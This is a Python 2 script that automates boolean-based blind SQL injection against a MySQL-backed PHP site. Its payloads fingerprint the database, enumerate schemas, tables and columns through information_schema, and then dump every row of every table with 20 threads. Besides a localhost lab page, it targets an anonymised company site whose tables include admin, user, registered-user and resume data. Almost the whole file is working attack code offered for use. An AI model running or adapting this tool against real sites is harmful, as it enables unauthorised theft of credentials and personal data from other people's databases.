#-*- coding:gb2312 -*-

import sys
import time
import urllib
import urllib2
import binascii
import threading
from Queue import Queue

allSchemaList=[]
tableRelectColumns={}
tableReflect={}
focusTableList=[]
focusSchema="npg"
#focusTable=""#not use 
logFile="baseResult.txt"
moreLogFile="moreLog.txt"
#logfile="advanceResult.txt"
DEBUG=False
WebSite="xxx"
# mylock=thread.allocate_lock() 
zxUrl="http://localhost/blindinjection/news.php?id=1"

#test internet
def testLink():
  linkFlag=True
  try:
    urllib2.urlopen("http://www.baidu.com").read()
  except Exception, e:
    linkFlag=False
  return linkFlag

# log output to stdout and logfile
def myPrint(strs,printTime=False) :
  nowTime=""
  if printTime:
    nowTime=time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(time.time()))+" "
    strs=nowTime+strs
  print strs,
  #sys.stdout.flush()
  sysStdOut=open(logFile,"a")
  sysStdOut.write(strs)
  sysStdOut.close()

#make a details log 
def logPrint(strs,printTime=True): 
  nowTime=""
  if printTime:
    nowTime=time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(time.time()))+" "
    strs=nowTime+strs
  #print strs,
  sysStdOut=open(moreLogFile,"a")
  sysStdOut.write(strs+"\n")
  sysStdOut.close()

#inject function
def inject(payload):
  global zxUrl
  url =zxUrl+urllib2.quote(payload)
  #print url
  if DEBUG:
    logPrint(zxUrl+urllib2.quote(payload))
  response="None"
  try:
    opener=urllib2.build_opener(urllib2.HTTPHandler)
    response=opener.open(url)
    data= response.read()
  except Exception, e:
    myPrint("\n wait 5 second retry connect success 1 times \n")
    time.sleep(5)
    #myPrint("connect error!\n")
    try:
      opener=urllib2.build_opener(urllib2.HTTPHandler)
      response=opener.open(url)
      data= response.read()
    except Exception, e:
      myPrint("wait 10 second retry connect success 2 times \n")
      time.sleep(10)
      try:
        opener=urllib2.build_opener(urllib2.HTTPHandler)
        response=opener.open(url)  
        data= response.read() 
      except Exception, e:
        myPrint("wait 120 second retry connect success 2 times \n") 
        time.sleep(120)
        while(testLink()==False):
          time.sleep(120)
        opener=urllib2.build_opener(urllib2.HTTPHandler)
        response=opener.open(url)   
        data= response.read()
  Flag=False
  #raw_input("next")
  if (data.find("3亿元")==-1):
    #print "error" 
    return False
  else:
    #print "suc"
    return True

#guess the length of item, 
#limit default equal to 1024 if guesss table item counts
# if guess the length of table column counts , suggest 512
def guessLength(payload,limit=1024):
  i=0
  length=0
  base=0
  counts=1
  st=[]
  while i<counts:
    low=0
    high=limit 
    while low<=high:
      middle=(low+high)/2
      if(inject(payload%(base+middle))):
        low=middle+1
      else:
        high=middle-1   
    length=high+base+1
    i=i+1
  return length
  
# Guess the item, it is usually used for guess detail information
# we use hex(*) return the blind results, this method can add the 
# compute task, but we make the range from 0 to 127 decrease to 48 to 91
# and we improve the complex and clear.
def guessItem(payload,length,unhexFlag=True):
  global DEBUG
  i=1
  base=0
  counts=int(length)
  st=[]
  while i<counts:
    if unhexFlag:
      low=48#0#48
      high=91#127#91
    else:
      low=0
      high=127 #assii max 127
    while low<=high:
      middle=(low+high)/2
      if(inject(payload%(i,base+middle))):
        low=middle+1
      else:
        high=middle-1
    st.append(chr(high+base+1))
    #print str(high+base+1)+chr(high+base+1),
    i=i+1
  key=''.join(st)
  if unhexFlag:
    returnHex=binascii.unhexlify(key)
  else:
    returnHex=key
  #myPrint(returnHex+" ")
  if DEBUG:
    myPrint("==>debug:key={"+key+"}\n",True)
  else:
    pass
    #myPrint(" \n")
  return returnHex

# change "abc" to hex style "616263",
# this function may be improve
def str2hex(input):
  hexdata=[]
  for i in input:
    temp=hex(ord(i))
    hexdata.append(temp)
  hexStr2="".join(hexdata)
  hexStr2=hexStr2.replace("0x","")
  hexStr2="0x"+hexStr2
  return hexStr2

# get user()+database()+version()
def getDatabaseFinger():
  myPrint("Finger#user:database:version ")
  payload=" and ((select length(concat_ws(0x3a,user(),database(),version())) )>%d)-- -"
  length=guessLength(payload,200)+1
  #print length
  #raw_input("**")
  guessItem(" and ((select ord(mid(concat_ws(0x3a,user(),database(),version()),%d,1)))>%d)-- -",length,False)

# get all schema
def getallschemas():
  global allSchemaList
  myPrint("All schemas# ")
  payload=" and ((select length((group_concat(schema_name))) from information_schema.schemata)>%d)-- -"
  length=guessLength(payload)+1
  print "length",length
  schemaStr=guessItem(" and ((select ord(mid((group_concat(schema_name)),%d,1)) from information_schema.schemata)>%d)-- -",length,False)
  #print schemaStr
  allSchemaList=schemaStr.split(",")
 
# get all tables in shcema
def getTableBySchema(schema):
  global focusTableList
  schemaHex=str2hex(schema)
  myPrint("Table in schema<"+schema+">: ")
  payload=" and ((select length(group_concat(table_name)) from information_schema.tables where table_schema ="+schemaHex+")>%d)-- - "
  length=guessLength(payload)+1
  tableStr=guessItem(" and ((select ord(mid(group_concat(table_name),%d,1)) from information_schema.tables where table_schema ="+schemaHex+")>%d)-- -",length,False)
  myPrint(tableStr+"\n")
  temp=tableStr.split(",")
  if schema==focusSchema:
    focusTableList=temp
  return temp

# get all tables in remote database
def getAllTables():
  global allSchemaList
  global tableReflect
  tableReflect.clear()
  for schema in allSchemaList:
    tableReflect[schema]=getTableBySchema(schema)
 
# get all columns in table tableName
def getColumnsByTable(tableName,schemaName):
  global focusTableList
  global focusSchema
  tableHex=str2hex(tableName)
  schemaHex=str2hex(schemaName)
  myPrint("Columns in <"+schemaName+","+tableName+">:",True)
  payload=" and ((select length(group_concat(column_name)) from information_schema.columns where table_name ="+tableHex+"  and table_schema="+schemaHex+")>%d)-- - "
  length=guessLength(payload,100)+1
  if length>101: 
    length=guessLength(payload,1024)+1
  columnStr=guessItem(" and ((select ord(mid(group_concat(column_name),%d,1)) from information_schema.columns where table_name="+tableHex+" and table_schema ="+schemaHex+")>%d)-- -",length,False)
  myPrint(columnStr+"\n")
  columnList=columnStr.split(",")
  tableRelectColumns[schemaName+"."+tableName]=columnList

# get all columns in remote database
def getAllColumns():
  global allSchemaList
  global tableReflect
  for schema in allSchemaList:
    for tableName in tableReflect[schema]:
      getColumnsByTable(tableName,schema)

#read table colum relation from file 
def getTableAndColumnsListFromFile():
  global tableRelectColumns
  openFile=open("tableAndColumns.txt","rb")
  tableRelectColumns={}
  item=openFile.readline()
  while item:
    item=item[:-2]
    splitList=item.split(":")
    columns=[]
    schemaTableName=splitList[0]
    columnsList=splitList[1].split(",")
    i=0
    for i in range(len(columnsList)):
      columns.append(columnsList[i])
    tableRelectColumns[schemaTableName]=columns
    item=openFile.readline()
  openFile.close()
  #print tableRelectColumns

#combind all table columns together
def capsuleSQLStr(table):
  colums=tableRelectColumns[table]
  returnSQL=""
  for i in range(len(colums)):
    returnSQL+=colums[i]+','
  return returnSQL[:-1]

#get all item in table
def getAllItemsInTable(tableItem,schema):
  table=schema+"."+tableItem
  i=0
  sqlStr=capsuleSQLStr(table)
  tableEx=schema+".`"+tableItem+"`"
  #########
  # mylock.acquire()
  myPrint("^^^ "+tableEx+":"+sqlStr+"^^^\n");
  # mylock.release()
  #########
  payload=" and ((select count(*) from "+tableEx+" )>%d)-- -"
  itemLen=guessLength(payload,1)+1
  if itemLen==1:
    myPrint("<<"+tableEx+">> has :<0> item:\n",True)  
    return 
  itemLen=guessLength(payload,100)+1
  if itemLen>101:
    itemLen=guessLength(payload,4096)+1
    if itemLen>4097:
      itemLen=guessLength(payload,10240)+1
      if itemLen>10241:
        itemLen=guessLength(payload,200000)+1
  itemLen=itemLen-1
  #########
  # mylock.acquire()
  myPrint("<<"+tableEx+">> has :<"+str(itemLen)+"> item:\n",True)  
  # mylock.release()
  if(itemLen==0):
    # #########
    # mylock.acquire()
    # myPrint(table+" has nothing \n",True)
    # mylock.release()
    return 
  queue=Queue()    
  while i<itemLen:
    queue.put([i,sqlStr,tableEx])
    i=i+1
  machineList=[]
  #if()
  for i in range(20):
    t_name=" computeMachine"+str(i)
    computeMachine = multiGetItem(t_name, queue)
    machineList.append(computeMachine)
  for machineItem in machineList:
    machineItem.start()
  for machineItem in machineList:
    machineItem.join()

class multiGetItem(threading.Thread):
  def __init__(self,t_name,queue):
    threading.Thread.__init__(self,name=t_name)
    self.data=queue
  def run(self):
    #time.sleep(1)
    while self.data.qsize()>0:
      dataItem=self.data.get()
      index=dataItem[0]
      sqlStr=dataItem[1]
      tableEx=dataItem[2]
      payload=" and ((select length(hex(concat_ws(0x3a,"+sqlStr+"))) from "+tableEx+" limit "+str(index)+",1)>%d)-- -"
      length=guessLength(payload,100)+1
      if length>101:
        length=guessLength(payload,1000)+1
        if length>1001:
          length=guessLength(payload,10000)+1
          if length>10001:
            length=guessLength(payload,200000)+1
      #########
      # mylock.acquire()
      #myPrint("<<<"+tableEx+" index="+str(index)+","+str(length)+":#") 
      # mylock.release()
      payload=" and ((select  ord(mid(((hex(concat_ws(0x3a,"+sqlStr+")))),%d,1)) from "+tableEx+" limit "+str(index)+",1)>%d)-- -"
      returnHex=guessItem(payload,length,True)
      #########
      # mylock.acquire()
      myPrint("<<<"+tableEx+" index="+str(index)+","+str(length)+":#"+" "+returnHex+" BY::"+self.getName()+"\n")
      # mylock.acquire()
    


# get all table's items list
def getAllTableItems():
  global allSchemaList
  global tableReflect
  for schema in allSchemaList:
    for tableItem in tableReflect[schema]:
      getAllItemsInTable(tableItem,schema)
      # thread.start_new_thread(getAllItemsInTable,(tableItem,schema))
#   global focusTableList
#   for tableItem in focusTableList:
#     getAllItemsInTable(tableItem) 
  # myLock.acquire()
  # myLock.release()

#prepare for advance compute
def dataInit():
  global focusTableList
  global focusSchema
  global focusTable
  global allSchemaList
  global tableReflect
  global WebSite
  global zxUrl
  focusTableList=[]
  allSchemaList=["blindinjection"]
  tableReflect={}
  if WebSite=="xxx":
    zxUrl="http://www.xxx.cn/xxxcompany_detail.php?id=2303"
    allSchemaList=["xxx","xxxen"]
    focusSchema="npg"
    tableReflect["xxx"]=["bbs_forum","bbs_reply","branch","contact","feedback",\
    "homeimg","info","mag","news","old_rc_menu","procal",\
    "product","rc_admin","rc_lm","rc_loginblog","rc_menu","rc_news","rc_user",\
    "recruit","registeredusers","resume","tempdel"]
    tableReflect["xxxen"]=["bbs_forum","bbs_reply","branch","contact","feedback","homeimg",\
    "info","mag","news","old_rc_menu","procal","product","rc_admin","rc_lm","rc_loginblog","rc_menu",\
    "rc_news","rc_user","recruit","registeredusers","resume","tempdel"]
    focusTable=tableReflect["xxx"]

if __name__=="__main__":
  #base test
  #1.#
  #getDatabaseFinger()
  #getallschemas()
  #getTableBySchema("blindinjection")

  dataInit()

  if WebSite=="xxx":
    getTableAndColumnsListFromFile()
  else:
    getAllTables()
    getAllColumns() 

  #getAllItemsInTable("rc_admin")
  start=time.time()
  getAllTableItems()
  end=time.time()
  myPrint(" Done! Success!! ^^^^^^^^^ in "+str(end-start),True)
